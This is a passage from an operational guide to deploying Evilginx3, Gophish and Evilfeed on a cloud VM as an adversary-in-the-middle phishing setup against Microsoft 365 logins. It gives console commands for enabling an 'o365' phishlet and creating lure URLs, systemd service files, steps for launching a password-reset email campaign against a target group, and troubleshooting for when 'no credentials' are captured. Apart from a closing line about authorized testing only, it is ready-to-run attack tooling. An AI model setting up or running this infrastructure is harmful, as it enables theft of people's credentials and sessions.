: phishlets enable o365
```
**Response:** Shows certificate generation and `phishlet 'o365' enabled`

```
: lures create o365
```
**Response:** `lure with id '0' created for phishlet 'o365'`

```
: lures get-url 0
```
**Response:** Shows your phishing URL like:
`https://accounts.secure-portal.com/some-path?client_id=xxxx`

**Save this URL! This is your phishing link.**

Exit Evilginx3:
```
: exit
```

---

## 15. Configure Gophish

### 15.1 Initialize Gophish Database

```bash
cd /opt/security-testing/evilgophish/gophish

# Start Gophish to initialize
./gophish &
sleep 10

# Get initial password
grep "Please login" gophish.log | tail -1
```

**Expected output:**
```
time="..." level=info msg="Please login with the username admin and the password XXXXXXXX"
```

**SAVE THIS PASSWORD!**

### 15.2 Stop Gophish

```bash
pkill gophish
```

### 15.3 Create Service Users

```bash
# Create users
useradd -r -s /bin/false gophish
useradd -r -s /bin/false evilfeed

# Create log directories
mkdir -p /var/log/{gophish,evilginx3,evilfeed}
chown gophish:gophish /var/log/gophish
chown root:root /var/log/evilginx3
chown evilfeed:evilfeed /var/log/evilfeed

# Set ownership
chown -R gophish:gophish /opt/security-testing/evilgophish/gophish
chown -R evilfeed:evilfeed /opt/security-testing/evilgophish/evilfeed
```

---

## 16. Create Systemd Services

### 16.1 Gophish Service

```bash
cat > /etc/systemd/system/gophish.service << 'EOF'
[Unit]
Description=Gophish Phishing Framework
After=network.target

[Service]
Type=simple
User=gophish
Group=gophish
WorkingDirectory=/opt/security-testing/evilgophish/gophish
ExecStart=/opt/security-testing/evilgophish/gophish/gophish
Restart=always
RestartSec=5
StandardOutput=append:/var/log/gophish/gophish.log
StandardError=append:/var/log/gophish/gophish-error.log

[Install]
WantedBy=multi-user.target
EOF
```

### 16.2 Evilginx3 Service

**Note: Replace YOUR_GCP_EXTERNAL_IP with your actual IP**

```bash
cat > /etc/systemd/system/evilginx3.service << 'EOF'
[Unit]
Description=Evilginx3 MITM Proxy
After=network.target gophish.service
Requires=gophish.service

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/security-testing/evilgophish/evilginx3
ExecStart=/opt/security-testing/evilgophish/evilginx3/evilginx3 -feed -g /opt/security-testing/evilgophish/gophish/gophish.db
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilginx3/evilginx3.log
StandardError=append:/var/log/evilginx3/evilginx3-error.log

[Install]
WantedBy=multi-user.target
EOF
```

### 16.3 Evilfeed Service

```bash
cat > /etc/systemd/system/evilfeed.service << 'EOF'
[Unit]
Description=Evilfeed Live Event Dashboard
After=network.target gophish.service

[Service]
Type=simple
User=evilfeed
Group=evilfeed
WorkingDirectory=/opt/security-testing/evilgophish/evilfeed
ExecStart=/opt/security-testing/evilgophish/evilfeed/evilfeed
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilfeed/evilfeed.log
StandardError=append:/var/log/evilfeed/evilfeed-error.log

[Install]
WantedBy=multi-user.target
EOF
```

### 16.4 Reload Systemd

```bash
systemctl daemon-reload
systemctl enable gophish evilginx3 evilfeed
```

---

## 17. Start and Test Services

### 17.1 Start All Services

```bash
# Start Apache
systemctl start apache2
systemctl status apache2
```
**Expected:** `Active: active (running)`

```bash
# Start Gophish
systemctl start gophish
sleep 3
systemctl status gophish
```
**Expected:** `Active: active (running)`

```bash
# Start Evilginx3
systemctl start evilginx3
sleep 3
systemctl status evilginx3
```
**Expected:** `Active: active (running)`

```bash
# Start Evilfeed
systemctl start evilfeed
systemctl status evilfeed
```
**Expected:** `Active: active (running)`

### 17.2 Verify Ports

```bash
netstat -tulpn | grep -E ':53|:80|:443|:3333|:1337|:8443'
```

**Expected output:**
```
tcp   ...  0.0.0.0:53      LISTEN   .../evilginx3
tcp   ...  0.0.0.0:80      LISTEN   .../apache2
tcp   ...  0.0.0.0:443     LISTEN   .../apache2
tcp   ...  127.0.0.1:3333  LISTEN   .../gophish
tcp   ...  127.0.0.1:1337  LISTEN   .../evilfeed
tcp   ...  127.0.0.1:8443  LISTEN   .../evilginx3
```

### 17.3 Test External Access

From your local machine (not the GCP VM):

```bash
curl -I https://accounts.secure-portal.com
```

**Expected:** HTTP response headers (may show certificate warnings with self-signed certs)

---

## 18. Access Dashboards

### 18.1 SSH Tunnel for Gophish Admin

Since Gophish admin binds to localhost, create an SSH tunnel:

**From your local machine terminal:**

Using gcloud:
```bash
gcloud compute ssh evilgophish-server \
    --zone=us-central1-a \
    --project=evilgophish-prod \
    -- -L 3333:127.0.0.1:3333 -L 1337:127.0.0.1:1337
```

Or using standard SSH:
```bash
ssh -L 3333:127.0.0.1:3333 -L 1337:127.0.0.1:1337 your-username@YOUR_GCP_EXTERNAL_IP
```

**Keep this terminal open.**

### 18.2 Access Gophish Admin

1. Open web browser
2. Navigate to: `https://localhost:3333`
3. Accept certificate warning (self-signed)
4. Login:
   - Username: `admin`
   - Password: (the password from step 15.1)
5. You'll be prompted to change the password

### 18.3 Access Evilfeed Dashboard

1. Open web browser
2. Navigate to: `http://localhost:1337`
3. You should see the live feed dashboard

---

## 19. Create Your First Campaign

### 19.1 In Gophish Admin

#### Step 1: Create Sending Profile

1. Click **"Sending Profiles"** in left menu
2. Click **"New Profile"**
3. Fill in:
   - Name: `Test SMTP`
   - From: `security@yourcompany.com`
   - Host: `smtp.yourprovider.com:587`
   - Username: Your SMTP username
   - Password: Your SMTP password
4. Click **"Send Test Email"** to verify
5. Click **"Save Profile"**

#### Step 2: Create Email Template

1. Click **"Email Templates"**
2. Click **"New Template"**
3. Fill in:
   - Name: `Password Reset`
   - Subject: `Action Required: Password Reset`
   - HTML: Your email HTML content
   - Include `{{.URL}}` where you want the phishing link
4. Click **"Save Template"**

#### Step 3: Create Landing Page

(Not required for EvilGophish - Evilginx3 handles this)

Skip this step.

#### Step 4: Create Users & Groups

1. Click **"Users & Groups"**
2. Click **"New Group"**
3. Name: `Test Targets`
4. Add targets (CSV or manual):
   - First Name
   - Last Name
   - Email
   - Position
5. Click **"Save Group"**

#### Step 5: Create Campaign

1. Click **"Campaigns"**
2. Click **"New Campaign"**
3. Fill in:
   - Name: `Test Campaign`
   - Email Template: Select your template
   - Landing Page: Leave empty
   - **URL**: Your Evilginx3 lure URL (from step 14.3)
   - Sending Profile: Select your profile
   - Groups: Select your target group
4. Click **"Launch Campaign"**

### 19.2 Monitor Results

1. Go to **"Campaigns"** → Click your campaign
2. View stats:
   - Emails sent
   - Emails opened
   - Links clicked
   - Credentials submitted
3. Check Evilfeed (localhost:1337) for real-time updates

---

## 20. Troubleshooting

### Issue: Service won't start

**Check logs:**
```bash
journalctl -u gophish -n 50
journalctl -u evilginx3 -n 50
journalctl -u evilfeed -n 50
```

**Check error logs:**
```bash
tail -50 /var/log/gophish/gophish-error.log
tail -50 /var/log/evilginx3/evilginx3-error.log
```

### Issue: Port already in use

```bash
# Find what's using the port
lsof -i :53
lsof -i :443

# Kill the process or stop the service
systemctl stop systemd-resolved  # For port 53
```

### Issue: SSL certificate errors

```bash
# Check certificate
openssl s_client -connect accounts.secure-portal.com:443 -servername accounts.secure-portal.com

# Renew Let's Encrypt
certbot renew --force-renewal
systemctl restart apache2
```

### Issue: DNS not resolving

```bash
# Test DNS
dig accounts.secure-portal.com @8.8.8.8

# Check /etc/hosts
cat /etc/hosts

# Check resolv.conf
cat /etc/resolv.conf
```

### Issue: Apache returns 503

**Backend (Evilginx3) not running:**
```bash
systemctl status evilginx3
systemctl start evilginx3

# Check it's listening
netstat -tlpn | grep 8443
```

### Issue: No credentials captured

**Check Evilginx3 config:**
```bash
# Connect to evilginx3 manually
cd /opt/security-testing/evilgophish/evilginx3
./evilginx3 -developer -g /opt/security-testing/evilgophish/gophish/gophish.db

# In console:
: phishlets
: lures
: sessions
```

### Issue: GCP firewall blocking traffic

1. Go to GCP Console → VPC Network → Firewall
2. Verify rules exist for ports 53, 80, 443
3. Verify VM has `evilgophish` network tag

### View All Logs at Once

```bash
tail -f /var/log/gophish/*.log /var/log/evilginx3/*.log /var/log/apache2/bitb*.log
```

---

## Quick Reference

### Important Paths

| Component | Path |
|-----------|------|
| EvilGophish | `/opt/security-testing/evilgophish/` |
| Frameless-BitB | `/opt/security-testing/frameless-bitb/` |
| Gophish Binary | `/opt/security-testing/evilgophish/gophish/gophish` |
| Gophish Database | `/opt/security-testing/evilgophish/gophish/gophish.db` |
| Evilginx3 Binary | `/opt/security-testing/evilgophish/evilginx3/evilginx3` |
| Evilginx3 Config | `/root/.evilginx/` |
| Phishlets | `/opt/security-testing/evilgophish/evilginx3/phishlets/` |
| BitB Pages | `/var/www/bitb/` |
| Apache Config | `/etc/apache2/sites-available/bitb.conf` |
| SSL Certs | `/etc/letsencrypt/live/accounts.YOUR_DOMAIN/` |
| Logs | `/var/log/{gophish,evilginx3,evilfeed,apache2}/` |

### Service Commands

```bash
# Start all
systemctl start apache2 gophish evilginx3 evilfeed

# Stop all
systemctl stop apache2 gophish evilginx3 evilfeed

# Restart all
systemctl restart apache2 gophish evilginx3 evilfeed

# Check status
systemctl status apache2 gophish evilginx3 evilfeed
```

### Access Points

| Service | URL | Access Method |
|---------|-----|---------------|
| Gophish Admin | https://127.0.0.1:3333 | SSH Tunnel |
| Evilfeed | http://127.0.0.1:1337 | SSH Tunnel |
| Phishing Site | https://accounts.YOUR_DOMAIN | Direct |

---

## Next Steps

1. **Test the full flow** - Send test emails and verify capture
2. **Customize phishlet** - Modify O365.yaml for your target
3. **Add more subdomains** - Create additional lures
4. **Enable Turnstile** - Add CAPTCHA protection
5. **Setup monitoring** - Use the monitor.sh script
6. **Configure backups** - Use the backup.sh script
7. **Harden further** - Implement additional security measures

---

**Remember: This infrastructure is for authorized security testing only. Always have written permission before conducting any tests.**
